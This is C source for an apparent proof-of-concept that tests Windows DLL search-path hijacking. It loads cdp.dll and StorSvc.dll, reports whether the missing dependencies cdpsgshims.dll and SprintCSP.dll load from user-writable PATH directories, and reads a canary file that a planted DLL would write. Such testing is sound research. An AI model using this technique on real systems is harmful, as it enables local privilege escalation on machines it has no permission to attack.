#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

int main(void) {
    printf("[*] DLL Search Path Proof-of-Concept\n");
    printf("[*] Loading cdp.dll to trigger cdpsgshims.dll search...\n\n");
    
    // First show our process PATH
    char pathBuf[32768] = {0};
    GetEnvironmentVariableA("PATH", pathBuf, sizeof(pathBuf));
    printf("[*] Process PATH includes user-writable dirs:\n");
    
    // Check canary before
    HANDLE hPre = CreateFileA("C:\\Windows\\Temp\\vader_path_hijack.log",
        GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hPre != INVALID_HANDLE_VALUE) {
        printf("[*] Canary already exists before load\n");
        CloseHandle(hPre);
    }
    
    // Try loading cdp.dll (which references cdpsgshims.dll)
    printf("\n[*] LoadLibrary(\"cdp.dll\")...\n");
    HMODULE hCdp = LoadLibraryW(L"cdp.dll");
    if (hCdp) {
        printf("[+] cdp.dll loaded at 0x%p\n", hCdp);
        
        // Check if cdpsgshims.dll was loaded too
        HMODULE hShims = GetModuleHandleW(L"cdpsgshims.dll");
        if (hShims) {
            printf("[!!!] cdpsgshims.dll LOADED at 0x%p\n", hShims);
            
            // Get the actual path it was loaded from
            wchar_t shimPath[MAX_PATH] = {0};
            GetModuleFileNameW(hShims, shimPath, MAX_PATH);
            printf("[!!!] Loaded from: %ls\n", shimPath);
        } else {
            printf("[-] cdpsgshims.dll not loaded (delay-load, needs function call)\n");
        }
        
        FreeLibrary(hCdp);
    } else {
        printf("[-] cdp.dll load failed: %lu\n", GetLastError());
    }
    
    // Try loading StorSvc.dll 
    printf("\n[*] LoadLibrary(\"StorSvc.dll\")...\n");
    HMODULE hStor = LoadLibraryW(L"StorSvc.dll");
    if (hStor) {
        printf("[+] StorSvc.dll loaded at 0x%p\n", hStor);
        
        HMODULE hSprint = GetModuleHandleW(L"SprintCSP.dll");
        if (hSprint) {
            printf("[!!!] SprintCSP.dll LOADED at 0x%p\n", hSprint);
            wchar_t sprintPath[MAX_PATH] = {0};
            GetModuleFileNameW(hSprint, sprintPath, MAX_PATH);
            printf("[!!!] Loaded from: %ls\n", sprintPath);
        } else {
            printf("[-] SprintCSP.dll not loaded (delay-load, needs function call)\n");
        }
        
        FreeLibrary(hStor);
    } else {
        printf("[-] StorSvc.dll load failed: %lu\n", GetLastError());
    }
    
    // Check canary after
    printf("\n=== CANARY CHECK ===\n");
    HANDLE hPost = CreateFileA("C:\\Windows\\Temp\\vader_path_hijack.log",
        GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hPost != INVALID_HANDLE_VALUE) {
        char buf[4096] = {0};
        DWORD bytesRead;
        ReadFile(hPost, buf, sizeof(buf)-1, &bytesRead, NULL);
        CloseHandle(hPost);
        if (bytesRead > 0) {
            printf("[!!!] CANARY CONTENTS:\n%s\n", buf);
        } else {
            printf("[-] Canary empty\n");
        }
    } else {
        printf("[-] No canary file\n");
    }
    
    return 0;
}